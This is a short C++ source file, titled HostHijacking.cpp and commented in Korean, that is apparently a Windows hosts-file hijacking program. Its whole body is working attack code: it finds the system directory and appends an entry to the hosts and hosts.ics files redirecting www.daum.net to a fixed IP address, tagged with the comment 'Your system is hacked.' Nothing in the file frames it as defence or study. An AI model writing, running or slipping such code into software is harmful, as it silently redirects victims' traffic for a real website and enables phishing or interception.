// HostHijacking.cpp : 이 파일에는 'main' 함수가 포함됩니다. 거기서 프로그램 실행이 시작되고 종료됩니다.
//

#include <Windows.h>
#include <Shlobj.h>
#include <stdio.h>
#include <tchar.h>
#include <iostream>
#include <fstream>
#include <winerror.h>
#include <Shlobj.h>
#include <atlstr.h>		// to use CString
#include "Log.h"

using namespace std;

int main()
{
	TCHAR targetDir[_MAX_PATH];
	string hosts, hosts_ics;

	if (FAILED(SHGetFolderPath(NULL, CSIDL_SYSTEM, NULL,
		SHGFP_TYPE_CURRENT, targetDir)))
	{
		CLog::WriteError("ERROR: FAILED TO FIND :(", targetDir);
	}
	hosts = targetDir;
	hosts_ics = targetDir;

	hosts += "\\drivers\\etc\\hosts";
	hosts_ics += "\\drivers\\etc\\hosts.ics";

	ofstream dst1(hosts.c_str(), ios_base::out | ios_base::app);
	if (dst1.is_open() == true) {
		dst1 << "125.209.222.141     www.daum.net" << "\t\t" << "# Your system is hacked." << endl;
		dst1.close();
	}
	else
		CLog::WriteError("ERROR: FAILED TO FIND :(", hosts.c_str());

	ofstream dst2(hosts_ics.c_str(), ios_base::out | ios_base::app);
	if (dst2.is_open() == true) {
		dst2 << "125.209.222.141     www.daum.net" << "\t\t" << "# Your system is hacked." << endl;
		dst2.close();
	}
	else
		CLog::WriteError("ERROR: FAILED TO OPEN :(", hosts.c_str());



	return 0;
}

